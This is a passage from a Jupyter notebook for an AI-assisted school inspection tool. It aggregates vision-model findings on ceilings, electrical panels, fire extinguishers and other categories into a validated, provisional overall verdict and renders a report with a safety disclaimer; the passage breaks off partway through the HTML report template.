    human_review_required = False

    for result in category_results:
        if result["status"] != "completed":
            human_review_required = True
            error_message = result.get("error", {}).get("error_message", "Image job failed.")
            documentation_gaps.append({"image_id": result["image_id"], "gap": error_message})
            continue

        assessment = result["final_assessment"]
        risk = assessment["risk_assessment"]
        human_review_required = human_review_required or risk["requires_human_review"]

        comment_assessment = assessment["officer_comment_assessment"]
        if comment_assessment["documentation_gap"]:
            documentation_gaps.append({"image_id": result["image_id"], "gap": comment_assessment["reason"]})

        action_text = assessment["recommended_action"]["action_text"].strip()
        if action_text and action_text.lower() not in {"none", "no action needed"}:
            recommended_actions.append(action_text)

        for finding in assessment["visual_findings"]:
            if finding["visibility"] != "visible":
                continue

            severity = finding["severity"]
            if severity in issue_counts:
                issue_counts[severity] += 1

            if severity in ["high", "medium"]:
                key_findings.append(
                    {
                        "image_id": result["image_id"],
                        "issue_type": finding["issue_type"],
                        "severity": severity,
                        "evidence": finding["evidence"],
                    }
                )

    return {
        "category": category_name,
        "image_count": len(category_results),
        "category_status": classify_category(category_results),
        "overall_officer_comment": overall_comment,
        "issue_counts": issue_counts,
        "human_review_required": human_review_required,
        "key_findings": key_findings,
        "documentation_gaps": documentation_gaps,
        "recommended_actions": sorted(set(recommended_actions)),
    }


In [17]:

def save_category_outputs(category_state: CategoryRunState) -> CategoryRunState:
    """Save image JSON files and one compact category summary JSON."""

    category_name = category_state["category_name"]
    category_paths = category_state["category_paths"]

    for result in category_state["image_results"]:
        output_file = category_paths["model_output_path"] / f"{Path(result['image_id']).stem}.json"
        output_file.write_text(json.dumps(result, indent=2), encoding="utf-8")

    category_output_file = CATEGORY_OUTPUT_ROOT / f"{category_name}_image_assessments.json"
    category_output_file.write_text(json.dumps(category_state["category_summary"], indent=2), encoding="utf-8")

    category_state["saved_category_output_file"] = category_output_file
    return category_state


## Final All-Category Run

Run this cell when you are ready to call the image models for every configured category.

In [18]:

async def run_category_inspection(category_name: str) -> CategoryRunState | None:
    """Run one category through the LangGraph image workflow and save outputs."""

    category_paths = CATEGORY_PATHS_BY_NAME[category_name]
    category_state = init_category_state(
        category_name,
        category_paths,
        read_text_if_exists(category_paths["overall_comment_path"]),
        CATEGORY_SYSTEM_PROMPTS[category_name],
    )
    category_state["image_jobs"] = build_category_image_states(
        category_name,
        category_paths,
        CATEGORY_SYSTEM_PROMPTS[category_name],
    )

    if not category_state["image_jobs"]:
        print(f"{category_name}: no images found, skipping")
        return None

    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async def run_one(image_state: ImageAssessmentState) -> ImageAssessmentState:
        async with semaphore:
            return await image_assessment_graph.ainvoke(
                image_state,
                config={
                    "run_name": f"{category_name}:{image_state['raw_image_path'].name}",
                    "tags": ["school-inspection", category_name],
                    "metadata": {
                        "category": category_name,
                        "image_name": image_state["raw_image_path"].name,
                    },
                },
            )

    final_image_states = await asyncio.gather(*(run_one(image_state) for image_state in category_state["image_jobs"]))
    image_results = []
    human_review_queue = []

    for final_image_state in final_image_states:
        image_result = image_state_to_result(final_image_state)
        image_results.append(image_result)

        review_item = image_result["human_review"].get("item")
        if review_item:
            human_review_queue.append(review_item)

    category_state["image_results"] = image_results
    category_state["human_review_queue"] = human_review_queue
    category_state["human_review_required"] = bool(human_review_queue)
    category_state["category_summary"] = summarize_category(
        category_name,
        image_results,
        category_state["overall_comment"],
    )
    category_state["category_status"] = category_state["category_summary"]["category_status"]

    return save_category_outputs(category_state)


async def run_all_category_inspections(run_category_names: list[str]) -> FullInspectionRunState:
    """Run selected categories and collect saved outputs plus human-review queue."""

    full_run_state = init_full_run_state(run_category_names)
    category_states = {}
    all_human_review_queue = []
    saved_category_output_files = {}

    for category_name in run_category_names:
        category_state = await run_category_inspection(category_name)
        if category_state is None:
            continue

        category_states[category_name] = category_state
        all_human_review_queue.extend(category_state["human_review_queue"])
        saved_category_output_files[category_name] = category_state["saved_category_output_file"]

    full_run_state["category_states"] = category_states
    full_run_state["all_human_review_queue"] = all_human_review_queue
    full_run_state["saved_category_output_files"] = saved_category_output_files
    return full_run_state


RUN_CATEGORY_NAMES = CATEGORY_NAMES

try:
    with tracing_context(enabled=True, project_name=LANGSMITH_PROJECT):
        all_category_run_state = await run_all_category_inspections(RUN_CATEGORY_NAMES)
finally:
    wait_for_all_tracers()

all_category_run_state["saved_category_output_files"]


other: no images found, skipping


{'ceiling': WindowsPath('school_validation_outputs/category_outputs/ceiling_image_assessments.json'),
 'classroom': WindowsPath('school_validation_outputs/category_outputs/classroom_image_assessments.json'),
 'corridor': WindowsPath('school_validation_outputs/category_outputs/corridor_image_assessments.json'),
 'electrical': WindowsPath('school_validation_outputs/category_outputs/electrical_image_assessments.json'),
 'exterior': WindowsPath('school_validation_outputs/category_outputs/exterior_image_assessments.json'),
 'fire_extinguisher': WindowsPath('school_validation_outputs/category_outputs/fire_extinguisher_image_assessments.json'),
 'staircase': WindowsPath('school_validation_outputs/category_outputs/staircase_image_assessments.json'),
 'washroom': WindowsPath('school_validation_outputs/category_outputs/washroom_image_assessments.json')}

## Final Aggregation Preparation

These cells prepare compact category JSON and deterministic rollup state for the final school-level LLM. They do not call the final LLM or save the final report yet.

In [19]:

def utc_timestamp(timestamp: float) -> str:
    """Convert a file timestamp into an ISO UTC string."""

    return datetime.fromtimestamp(timestamp, timezone.utc).isoformat()


def load_category_outputs(full_run_state: FullInspectionRunState | None = None) -> tuple[dict[str, dict], list[dict]]:
    """Load saved compact category summary JSON files plus source metadata."""

    if full_run_state and full_run_state.get("saved_category_output_files"):
        source_type = "current_run_state"
        output_files = {
            category_name: Path(output_file)
            for category_name, output_file in full_run_state["saved_category_output_files"].items()
        }
    else:
        source_type = "disk_fallback"
        output_files = {
            category_name: CATEGORY_OUTPUT_ROOT / f"{category_name}_image_assessments.json"
            for category_name in CATEGORY_NAMES
        }

    category_outputs = {}
    source_files = []

    for category_name, output_file in output_files.items():
        if not output_file.exists():
            continue

        stat = output_file.stat()
        category_outputs[category_name] = json.loads(output_file.read_text(encoding="utf-8"))
        source_files.append(
            {
                "category": category_name,
                "path": str(output_file),
                "source_type": source_type,
                "last_modified_utc": utc_timestamp(stat.st_mtime),
                "size_bytes": stat.st_size,
            }
        )

    if not category_outputs:
        raise FileNotFoundError(
            "No category output JSON files were found. Run the all-category inspection cell first."
        )

    return category_outputs, source_files


In [20]:

MAX_FINAL_TEXT_CHARS = 900
MAX_FINAL_ITEMS_PER_CATEGORY = 12


def limit_text(value: str, max_chars: int = MAX_FINAL_TEXT_CHARS) -> str:
    """Keep long text fields short enough for final aggregation."""

    text = (value or "").strip()
    if len(text) <= max_chars:
        return text
    return f"{text[:max_chars].rstrip()}..."


def build_category_packet(category_output: dict) -> dict:
    """Create one compact category packet for the final LLM."""

    severity_rank = {"high": 0, "medium": 1, "low": 2, "unclear": 3, "none": 4}
    key_findings = sorted(
        category_output.get("key_findings", []),
        key=lambda item: severity_rank.get(item.get("severity", "unclear"), 99),
    )

    return {
        "category": category_output["category"],
        "image_count": category_output["image_count"],
        "category_status": category_output["category_status"],
        "overall_officer_comment": limit_text(category_output.get("overall_officer_comment", "")),
        "issue_counts": category_output.get("issue_counts", {"high": 0, "medium": 0, "low": 0}),
        "human_review_required": category_output.get("human_review_required", False),
        "key_findings": [
            {
                "image_id": finding.get("image_id", ""),
                "issue_type": limit_text(finding.get("issue_type", ""), 160),
                "severity": finding.get("severity", "unclear"),
                "evidence": limit_text(finding.get("evidence", ""), 500),
            }
            for finding in key_findings[:MAX_FINAL_ITEMS_PER_CATEGORY]
        ],
        "documentation_gaps": [
            {
                "image_id": gap.get("image_id", ""),
                "gap": limit_text(gap.get("gap", ""), 500),
            }
            for gap in category_output.get("documentation_gaps", [])[:MAX_FINAL_ITEMS_PER_CATEGORY]
        ],
        "recommended_actions": [
            limit_text(action, 500)
            for action in category_output.get("recommended_actions", [])[:MAX_FINAL_ITEMS_PER_CATEGORY]
        ],
    }


def build_category_packets(category_outputs: dict[str, dict]) -> list[dict]:
    """Create compact category packets in configured category order."""

    return [
        build_category_packet(category_outputs[category_name])
        for category_name in CATEGORY_NAMES
        if category_name in category_outputs
    ]


In [21]:

REQUIRE_ALL_CONFIGURED_CATEGORIES_FOR_COMPLETE_VERDICT = True


def build_global_rollup(category_packets: list[dict]) -> dict:
    """Compute deterministic all-category totals for the final LLM."""

    processed_categories = [packet["category"] for packet in category_packets]
    not_inspected_categories = [
        category_name
        for category_name in CATEGORY_NAMES
        if category_name not in processed_categories
    ]

    status_counts = {
        "acceptable_visible_condition": 0,
        "minor_maintenance": 0,
        "attention_required": 0,
        "urgent_review": 0,
        "insufficient_evidence": 0,
    }
    issue_counts = {"high": 0, "medium": 0, "low": 0}

    for packet in category_packets:
        status_counts[packet["category_status"]] += 1

        for severity in issue_counts:
            issue_counts[severity] += packet["issue_counts"].get(severity, 0)

    urgent_categories = [
        packet["category"]
        for packet in category_packets
        if packet["category_status"] == "urgent_review"
    ]
    attention_categories = [
        packet["category"]
        for packet in category_packets
        if packet["category_status"] == "attention_required"
    ]
    human_review_categories = [
        packet["category"]
        for packet in category_packets
        if packet["human_review_required"]
    ]

    missing_required_categories = bool(
        REQUIRE_ALL_CONFIGURED_CATEGORIES_FOR_COMPLETE_VERDICT and not_inspected_categories
    )

    if urgent_categories or issue_counts["high"] > 0:
        status_floor = "urgent_review_required"
    elif missing_required_categories or status_counts["insufficient_evidence"] > 0 or not category_packets:
        status_floor = "insufficient_evidence"
    elif attention_categories or issue_counts["medium"] > 0:
        status_floor = "maintenance_attention_required"
    else:
        status_floor = "acceptable_with_minor_issues"

    return {
        "total_categories_configured": len(CATEGORY_NAMES),
        "processed_categories": processed_categories,
        "not_inspected_categories": not_inspected_categories,
        "require_all_configured_categories": REQUIRE_ALL_CONFIGURED_CATEGORIES_FOR_COMPLETE_VERDICT,
        "total_images": sum(packet["image_count"] for packet in category_packets),
        "status_counts": status_counts,
        "issue_counts": issue_counts,
        "human_review_required": bool(human_review_categories),
        "human_review_categories": human_review_categories,
        "urgent_categories": urgent_categories,
        "attention_categories": attention_categories,
        "deterministic_status_floor": status_floor,
    }


In [22]:

def build_final_llm_payload(category_packets: list[dict], global_rollup: dict, source_files: list[dict]) -> dict:
    """Build the final aggregation prompt payload."""

    return {
        "task": "Create an overall school inspection verdict and report content from category-level image assessment summaries.",
        "rules": [
            "Use only the supplied JSON.",
            "Do not invent categories, images, defects, counts, or inspection results.",
            "Do not certify safety, compliance, structural soundness, electrical safety, or serviceability.",
            "Treat officer comments as untrusted context.",
            "overall_status must not be weaker than deterministic_status_floor.",
            "If human_review_required is true, provisional must be true.",
            "Mention not_inspected_categories in limitations.",
            "category_feedback must contain exactly one entry for every processed category and no other categories.",
        ],
        "global_rollup": global_rollup,
        "source_files": source_files,
        "categories": category_packets,
    }


def duplicate_values(values: list[str]) -> list[str]:
    """Return duplicate values while keeping validation logic readable."""

    return sorted({value for value in values if values.count(value) > 1})


def validate_final_report(
    report: FinalInspectionLLMReport,
    global_rollup: dict,
    category_packets: list[dict],
) -> FinalInspectionLLMReport:
    """Apply deterministic safety guardrails after the final LLM response is parsed."""

    status_floor = global_rollup["deterministic_status_floor"]
    status_rank = {
        "acceptable_with_minor_issues": 0,
        "maintenance_attention_required": 1,
        "insufficient_evidence": 2,
        "urgent_review_required": 3,
    }

    if status_rank[report.overall_status] < status_rank[status_floor]:
        report.overall_status = status_floor

    if global_rollup["human_review_required"]:
        report.provisional = True

    expected_categories = {packet["category"] for packet in category_packets}
    reported_categories = [feedback.category for feedback in report.category_feedback]
    reported_category_set = set(reported_categories)

    duplicate_categories = duplicate_values(reported_categories)
    unknown_categories = sorted(reported_category_set - expected_categories)
    missing_categories = sorted(expected_categories - reported_category_set)

    if duplicate_categories:
        raise ValueError(f"Final report category_feedback has duplicate categories: {duplicate_categories}")
    if unknown_categories:
        raise ValueError(f"Final report category_feedback invented categories: {unknown_categories}")
    if missing_categories:
        raise ValueError(f"Final report category_feedback omitted categories: {missing_categories}")

    not_inspected_categories = global_rollup.get("not_inspected_categories", [])
    if not_inspected_categories:
        missing_text = "Not inspected categories: " + ", ".join(not_inspected_categories)
        if not any("not inspected" in item.lower() for item in report.limitations):
            report.limitations.append(missing_text)

    return report


category_outputs, category_output_sources = load_category_outputs(
    all_category_run_state if "all_category_run_state" in globals() else None
)
category_packets = build_category_packets(category_outputs)
global_rollup = build_global_rollup(category_packets)
final_llm_payload = build_final_llm_payload(category_packets, global_rollup, category_output_sources)

print("Loaded category output files:")
for source_file in category_output_sources:
    print(f"- {source_file['category']}: {source_file['path']} ({source_file['last_modified_utc']})")

global_rollup


Loaded category output files:
- ceiling: school_validation_outputs\category_outputs\ceiling_image_assessments.json (2026-06-27T09:39:43.230008+00:00)
- classroom: school_validation_outputs\category_outputs\classroom_image_assessments.json (2026-06-27T09:40:10.809350+00:00)
- corridor: school_validation_outputs\category_outputs\corridor_image_assessments.json (2026-06-27T09:40:23.308233+00:00)
- electrical: school_validation_outputs\category_outputs\electrical_image_assessments.json (2026-06-27T09:40:50.138142+00:00)
- exterior: school_validation_outputs\category_outputs\exterior_image_assessments.json (2026-06-27T09:41:02.614357+00:00)
- fire_extinguisher: school_validation_outputs\category_outputs\fire_extinguisher_image_assessments.json (2026-06-27T09:41:30.823133+00:00)
- staircase: school_validation_outputs\category_outputs\staircase_image_assessments.json (2026-06-27T09:41:44.475867+00:00)
- washroom: school_validation_outputs\category_outputs\washroom_image_assessments.json (2026

{'total_categories_configured': 9,
 'processed_categories': ['ceiling',
  'classroom',
  'corridor',
  'electrical',
  'exterior',
  'fire_extinguisher',
  'staircase',
  'washroom'],
 'not_inspected_categories': ['other'],
 'require_all_configured_categories': True,
 'total_images': 27,
 'status_counts': {'acceptable_visible_condition': 0,
  'minor_maintenance': 1,
  'attention_required': 7,
  'urgent_review': 0,
  'insufficient_evidence': 0},
 'issue_counts': {'high': 0, 'medium': 14, 'low': 12},
 'human_review_required': True,
 'human_review_categories': ['fire_extinguisher'],
 'urgent_categories': [],
 'attention_categories': ['ceiling',
  'corridor',
  'electrical',
  'exterior',
  'fire_extinguisher',
  'staircase',
  'washroom'],
 'deterministic_status_floor': 'insufficient_evidence'}

In [23]:

print("Final LLM model:", FINAL_AGGREGATION_MODEL)
print("Processed categories:", global_rollup["processed_categories"])
print("Not inspected categories:", global_rollup["not_inspected_categories"])
print("Total images:", global_rollup["total_images"])
print("Status floor:", global_rollup["deterministic_status_floor"])

category_packets[0]


Final LLM model: gpt-4.1-mini
Processed categories: ['ceiling', 'classroom', 'corridor', 'electrical', 'exterior', 'fire_extinguisher', 'staircase', 'washroom']
Not inspected categories: ['other']
Total images: 27
Status floor: insufficient_evidence


{'category': 'ceiling',
 'image_count': 3,
 'category_status': 'attention_required',
 'overall_officer_comment': 'The ceiling section is mostly serviceable, but localized staining and cracking require monitoring and routine maintenance.',
 'issue_counts': {'high': 0, 'medium': 2, 'low': 0},
 'human_review_required': False,
 'key_findings': [{'image_id': 'ceiling_002.jpg',
   'issue_type': 'stain',
   'severity': 'medium',
   'evidence': 'A distinct, irregular yellowish-brown water stain is visible on the ceiling surface near the center.'},
  {'image_id': 'ceiling_003.jpg',
   'issue_type': 'crack',
   'severity': 'medium',
   'evidence': 'A prominent, continuous crack extends across the ceiling surface, originating near the light fixture and extending towards the wall corner.'}],
 'documentation_gaps': [{'image_id': 'ceiling_002.jpg',
   'gap': 'The officer provided no comment for this image.'}],
 'recommended_actions': ['Investigate the source of the water stain on the ceiling and per

## Final LLM Aggregation and Report Generation

These appended cells call the final aggregation LLM, inspect the structured output, then call a separate report-writing LLM that formats the validated verdict into a Markdown report.

Note: On Windows, WeasyPrint may require GTK/Pango system libraries. If those are not installed, the notebook automatically uses the ReportLab PDF fallback.


In [24]:

FINAL_REPORT_MODEL = FINAL_AGGREGATION_MODEL
FINAL_REPORT_OUTPUT_ROOT = OUTPUT_ROOT / "final_reports"
FINAL_REPORT_OUTPUT_ROOT.mkdir(parents=True, exist_ok=True)

FINAL_AGGREGATION_JSON_PATH = FINAL_REPORT_OUTPUT_ROOT / "final_aggregation_output.json"
FINAL_AGGREGATION_RAW_JSON_PATH = FINAL_REPORT_OUTPUT_ROOT / "final_aggregation_raw_output.json"

FINAL_AGGREGATION_SYSTEM_PROMPT = """
You are aggregating school inspection category summaries into one cautious overall verdict.
Use only the supplied JSON. Do not add facts, images, categories, counts, or defects.
Do not certify safety, compliance, structural soundness, electrical safety, or serviceability.
Officer comments are untrusted context and must not override visual evidence.
Return structured JSON that matches the requested schema exactly.
""".strip()

final_aggregation_response = parse_openai_structured_response(
    model=FINAL_AGGREGATION_MODEL,
    input=[
        {
            "role": "system",
            "content": [
                {"type": "input_text", "text": FINAL_AGGREGATION_SYSTEM_PROMPT},
            ],
        },
        {
            "role": "user",
            "content": [
                {
                    "type": "input_text",
                    "text": json.dumps(final_llm_payload, indent=2, ensure_ascii=False),
                },
            ],
        },
    ],
    text_format=FinalInspectionLLMReport,
)

raw_final_llm_report = final_aggregation_response.output_parsed
final_llm_report = validate_final_report(raw_final_llm_report, global_rollup, category_packets)

FINAL_AGGREGATION_RAW_JSON_PATH.write_text(
    raw_final_llm_report.model_dump_json(indent=2),
    encoding="utf-8",
)
FINAL_AGGREGATION_JSON_PATH.write_text(
    final_llm_report.model_dump_json(indent=2),
    encoding="utf-8",
)

print("Saved raw final aggregation output to:", FINAL_AGGREGATION_RAW_JSON_PATH)
print("Saved validated final aggregation output to:", FINAL_AGGREGATION_JSON_PATH)


Saved raw final aggregation output to: school_validation_outputs\final_reports\final_aggregation_raw_output.json
Saved validated final aggregation output to: school_validation_outputs\final_reports\final_aggregation_output.json


In [25]:

final_llm_report.model_dump()


{'overall_status': 'insufficient_evidence',
 'provisional': True,
 'executive_summary': 'The majority of inspected categories require attention due to medium severity issues such as water stains, cracks, corrosion, damage, and obstructions. No high severity or urgent issues were found, but multiple medium-level maintenance concerns exist across most categories, especially fire extinguishers which also require human review. Minor maintenance is noted in the classroom category. Limitations include the absence of inspection data for the "other" category.',
 'key_risks': ['Water stains and cracks in ceiling and exterior walls may indicate moisture or structural issues requiring professional assessment.',
  'Corrosion and damage to fire extinguishers may impair their functionality and necessitate urgent human review.',
  'Obstructions in corridors and damaged staircase railings present tripping or safety hazards needing timely maintenance.',
  'Open and exposed electrical panel components p

In [26]:

REPORT_DISCLAIMER = (
    "This AI-assisted visual inspection summary does not certify safety, compliance, "
    "structural soundness, electrical safety, or serviceability. It must be reviewed "
    "by qualified personnel before decisions are made."
)

REPORT_IMAGE_DIR = Path("utility_files") / "report_img"
SUPPORTED_REPORT_IMAGE_EXTENSIONS = {".png", ".jpg", ".jpeg", ".webp"}
REPORT_COVER_IMAGE_PATH = next(
    iter(
        sorted(
            image_path
            for image_path in REPORT_IMAGE_DIR.glob("*")
            if image_path.suffix.lower() in SUPPORTED_REPORT_IMAGE_EXTENSIONS
        )
    ),
    None,
)


def image_path_to_data_url(image_path: Path | None) -> str:
    """Return a browser/PDF friendly data URL for the report cover image."""

    if not image_path or not image_path.exists():
        return ""

    mime_type = {
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".png": "image/png",
        ".webp": "image/webp",
    }.get(image_path.suffix.lower(), "image/png")
    image_base64 = base64.b64encode(image_path.read_bytes()).decode("utf-8")
    return f"data:{mime_type};base64,{image_base64}"


class FinalReportCategorySection(BaseModel):
    """Report-ready content for one inspection category."""

    category: str
    status: CategoryStatus
    priority: Literal["low", "medium", "high", "urgent"]
    summary: str = Field(max_length=900)
    evidence_refs: list[str]
    recommended_actions: list[str]


class FinalReportContent(BaseModel):
    """Structured report content rendered by deterministic templates."""

    title: str = Field(max_length=180)
    overall_status: OverallInspectionStatus
    provisional: bool
    executive_summary: list[str]
    scope_and_inputs: list[str]
    category_sections: list[FinalReportCategorySection]
    immediate_actions: list[str]
    maintenance_actions: list[str]
    documentation_followups: list[str]
    human_review_notes: list[str]
    limitations: list[str]
    disclaimer: str


def build_report_generation_payload(
    final_report: FinalInspectionLLMReport,
    category_packets: list[dict],
    global_rollup: dict,
    source_files: list[dict],
) -> dict:
    """Create the report-content payload from validated aggregation output."""

    return {
        "task": "Create structured report content from the validated school inspection verdict.",
        "rules": [
            "Use only the supplied JSON.",
            "Do not change the overall_status, provisional flag, counts, categories, or action priorities.",
            "Do not invent new evidence, defects, measurements, or certifications.",
            "Return content only; layout will be rendered by deterministic code.",
            "category_sections must contain exactly one entry for every processed category and no other categories.",
            f"Use this exact disclaimer: {REPORT_DISCLAIMER}",
        ],
        "validated_final_verdict": final_report.model_dump(mode="json"),
        "global_rollup": global_rollup,
        "source_files": source_files,
        "categories": category_packets,
    }


def validate_final_report_content(
    content: FinalReportContent,
    final_report: FinalInspectionLLMReport,
    category_packets: list[dict],
    global_rollup: dict,
) -> FinalReportContent:
    """Validate structured report content before rendering any files."""

    if content.overall_status != final_report.overall_status:
        raise ValueError("Report content changed the validated overall_status.")
    if content.provisional != final_report.provisional:
        raise ValueError("Report content changed the validated provisional flag.")

    expected_categories = {packet["category"] for packet in category_packets}
    reported_categories = [section.category for section in content.category_sections]
    reported_category_set = set(reported_categories)

    duplicate_categories = duplicate_values(reported_categories)
    unknown_categories = sorted(reported_category_set - expected_categories)
    missing_categories = sorted(expected_categories - reported_category_set)

    if duplicate_categories:
        raise ValueError(f"Report content has duplicate category sections: {duplicate_categories}")
    if unknown_categories:
        raise ValueError(f"Report content invented category sections: {unknown_categories}")
    if missing_categories:
        raise ValueError(f"Report content omitted category sections: {missing_categories}")

    limitation_text = "\n".join(content.limitations).lower()
    missing_not_inspected = [
        category_name
        for category_name in global_rollup.get("not_inspected_categories", [])
        if category_name.lower() not in limitation_text
    ]
    if missing_not_inspected:
        raise ValueError(f"Report content omitted not-inspected categories: {missing_not_inspected}")

    if REPORT_DISCLAIMER != content.disclaimer:
        raise ValueError("Report content did not preserve the required disclaimer exactly.")

    return content


def status_label(value: str) -> str:
    """Convert schema labels into report-friendly labels."""

    return value.replace("_", " ").title()


def markdown_list(items: list[str]) -> str:
    """Render a compact Markdown bullet list."""

    cleaned_items = [item.strip() for item in items if item and item.strip()]
    if not cleaned_items:
        return "- None recorded."
    return "\n".join(f"- {item}" for item in cleaned_items)


def markdown_table_value(value: object) -> str:
    """Escape values used in Markdown tables."""

    return str(value).replace("|", "\\|").replace("\n", " ")


def build_report_metadata(source_files: list[dict], global_rollup: dict) -> dict:
    """Collect deterministic metadata used by report renderers and appendices."""

    return {
        "generated_at_utc": datetime.now(timezone.utc).isoformat(),
        "final_aggregation_json_path": str(FINAL_AGGREGATION_JSON_PATH),
        "report_content_json_path": str(FINAL_REPORT_OUTPUT_ROOT / "school_safety_final_report_content.json"),
        "cover_image_path": str(REPORT_COVER_IMAGE_PATH) if REPORT_COVER_IMAGE_PATH else "",
        "category_output_sources": source_files,
        "models": {
            "primary_vlm_model": PRIMARY_VLM_MODEL,
            "backup_vlm_model": BACKUP_VLM_MODEL,
            "escalation_review_model": ESCALATION_REVIEW_MODEL,
            "final_aggregation_model": FINAL_AGGREGATION_MODEL,
            "final_report_model": FINAL_REPORT_MODEL,
        },
        "processed_categories": global_rollup["processed_categories"],
        "not_inspected_categories": global_rollup["not_inspected_categories"],
        "total_images": global_rollup["total_images"],
        "deterministic_status_floor": global_rollup["deterministic_status_floor"],
    }


def render_report_markdown(content: FinalReportContent, metadata: dict, category_packets: list[dict]) -> str:
    """Render the final report as deterministic Markdown."""

    packet_by_category = {packet["category"]: packet for packet in category_packets}
    category_rows = [
        "| Category | Status | Images | High | Medium | Low | Human Review |",
        "| --- | --- | ---: | ---: | ---: | ---: | --- |",
    ]

    for section in content.category_sections:
        packet = packet_by_category[section.category]
        counts = packet["issue_counts"]
        category_rows.append(
            "| "
            + " | ".join(
                [
                    markdown_table_value(section.category),
                    markdown_table_value(status_label(section.status)),
                    markdown_table_value(packet["image_count"]),
                    markdown_table_value(counts.get("high", 0)),
                    markdown_table_value(counts.get("medium", 0)),
                    markdown_table_value(counts.get("low", 0)),
                    markdown_table_value("Yes" if packet["human_review_required"] else "No"),
                ]
            )
            + " |"
        )

    category_sections = []
    for section in content.category_sections:
        category_sections.append(
            f"### {section.category}\n\n"
            f"- Status: {status_label(section.status)}\n"
            f"- Priority: {status_label(section.priority)}\n\n"
            f"{section.summary}\n\n"
            f"Evidence references:\n{markdown_list(section.evidence_refs)}\n\n"
            f"Recommended actions:\n{markdown_list(section.recommended_actions)}"
        )

    source_lines = [
        f"- {item['category']}: {item['path']} ({item['last_modified_utc']})"
        for item in metadata["category_output_sources"]
    ]

    appendix = {
        "final_aggregation_json_path": metadata["final_aggregation_json_path"],
        "report_content_json_path": metadata["report_content_json_path"],
        "models": metadata["models"],
        "processed_categories": metadata["processed_categories"],
        "not_inspected_categories": metadata["not_inspected_categories"],
        "total_images": metadata["total_images"],
        "deterministic_status_floor": metadata["deterministic_status_floor"],
    }

    cover_lines = []
    if metadata.get("cover_image_path"):
        cover_lines = [
            f"![Report cover]({metadata['cover_image_path']})",
            "",
        ]

    return "\n\n".join(
        [
            *cover_lines,
            f"# {content.title}",
            f"Generated at: {metadata['generated_at_utc']}",
            "## Overall Verdict\n\n"
            f"- Overall status: {content.overall_status}\n"
            f"- Provisional: {'Yes' if content.provisional else 'No'}\n"
            f"- Deterministic status floor: {metadata['deterministic_status_floor']}",
            "## Executive Summary\n\n" + markdown_list(content.executive_summary),
            "## Scope and Inspected Categories\n\n" + markdown_list(content.scope_and_inputs),
            "## Input Provenance\n\n" + markdown_list(source_lines),
            "## Category Summary Table\n\n" + "\n".join(category_rows),
            "## Immediate Actions\n\n" + markdown_list(content.immediate_actions),
            "## Maintenance Actions\n\n" + markdown_list(content.maintenance_actions),
            "## Documentation Follow-ups\n\n" + markdown_list(content.documentation_followups),
            "## Human Review Notes\n\n" + markdown_list(content.human_review_notes),
            "## Category-by-Category Findings\n\n" + "\n\n".join(category_sections),
            "## Limitations and Disclaimer\n\n"
            + markdown_list(content.limitations)
            + f"\n\n{content.disclaimer}",
            "## Machine-Readable Appendix\n\n```json\n"
            + json.dumps(appendix, indent=2, ensure_ascii=False)
            + "\n```",
        ]
    ) + "\n"


REPORT_HTML_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>{{ content.title }}</title>
<style>
@page {
  size: A4;
  margin: 22mm 20mm;
  @top-left { content: "School Safety Final Report"; color: #52677a; font-size: 8pt; }
  @bottom-center { content: "AI-assisted visual inspection summary, not a safety certification - Page " counter(page) " of " counter(pages); color: #667085; font-size: 8pt; }
}
@page cover {
  margin: 0;
  @top-left { content: ""; }
  @bottom-center { content: ""; }
}
* { box-sizing: border-box; }
body { background: #ffffff; color: #172033; font-family: Arial, Helvetica, sans-serif; font-size: 10.5pt; line-height: 1.48; margin: 0; }
.cover { background: #071f3d; color: white; min-height: 297mm; padding: 22mm; page: cover; page-break-after: always; position: relative; }
.cover-grid { display: grid; gap: 16mm; grid-template-columns: 1fr; }
.cover-kicker { color: #9ed0ff; font-size: 10pt; font-weight: 700; letter-spacing: 0.08em; margin-bottom: 6mm; text-transform: uppercase; }
.cover h1 { color: white; font-size: 34pt; line-height: 1.08; margin: 0 0 7mm; max-width: 170mm; }
.cover-subtitle { color: #d8e7f7; font-size: 13pt; max-width: 150mm; }
.cover-meta { border-left: 4px solid #46b3ff; color: #e8f2ff; font-size: 10.5pt; margin-top: 11mm; padding-left: 6mm; }
.cover-image { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.18); border-radius: 14px; box-shadow: 0 18px 45px rgba(0, 0, 0, 0.28); margin-top: 12mm; padding: 5mm; }
.cover-image img { border-radius: 10px; display: block; width: 100%; }
.cover-footer { bottom: 18mm; color: #a9bfd7; font-size: 9pt; left: 22mm; position: absolute; right: 22mm; }
.report-shell { padding: 0; }
h1 { color: #102a43; font-size: 25pt; margin: 0 0 9mm; }
h2 { border-bottom: 2px solid #d7e3ef; color: #12385b; font-size: 15.5pt; margin-top: 10mm; padding-bottom: 2mm; }
h3 { color: #23435f; font-size: 12.5pt; margin-top: 7mm; }
p { margin: 2.5mm 0; }
table { border-collapse: collapse; margin: 4mm 0 7mm; width: 100%; }
th, td { border: 1px solid #c9d6e2; padding: 6px 8px; text-align: left; vertical-align: top; }
th { background: #eaf2f8; color: #153754; font-weight: 700; }
tbody tr:nth-child(even) { background: #f8fbfd; }
.badge { border-radius: 999px; color: white; display: inline-block; font-size: 9pt; font-weight: 700; letter-spacing: 0.02em; padding: 4px 10px; text-transform: uppercase; }
.urgent { background: #b42318; }
.medium { background: #b54708; }
.status-ok { background: #027a48; }
.status-insufficient { background: #667085; }
.summary-card { background: #f5f9fc; border: 1px solid #d7e3ef; border-left: 5px solid #2474a6; border-radius: 8px; margin: 5mm 0 7mm; padding: 5mm; }
.action-grid { display: grid; gap: 5mm; grid-template-columns: 1fr 1fr; }
.action-box { background: #fbfdff; border: 1px solid #d7e3ef; border-radius: 8px; padding: 4mm; }
.action-box h2 { border: 0; font-size: 12.5pt; margin: 0 0 3mm; padding: 0; }
.category-block { border-top: 1px solid #d7e3ef; padding-top: 5mm; page-break-inside: avoid; }
.meta { color: #52677a; font-size: 9pt; }
.disclaimer { background: #fff7ed; border: 1px solid #fed7aa; border-left: 5px solid #f97316; border-radius: 8px; padding: 8px 10px; }
code, pre { font-family: Consolas, monospace; font-size: 8.5pt; }
pre { background: #f7fafc; border: 1px solid #d7e3ef; border-radius: 6px; padding: 8px; white-space: pre-wrap; }
</style>
</head>
<body>
<section class="cover">
  <div class="cover-grid">
    <div>
      <div class="cover-kicker">AI-assisted school condition validator</div>
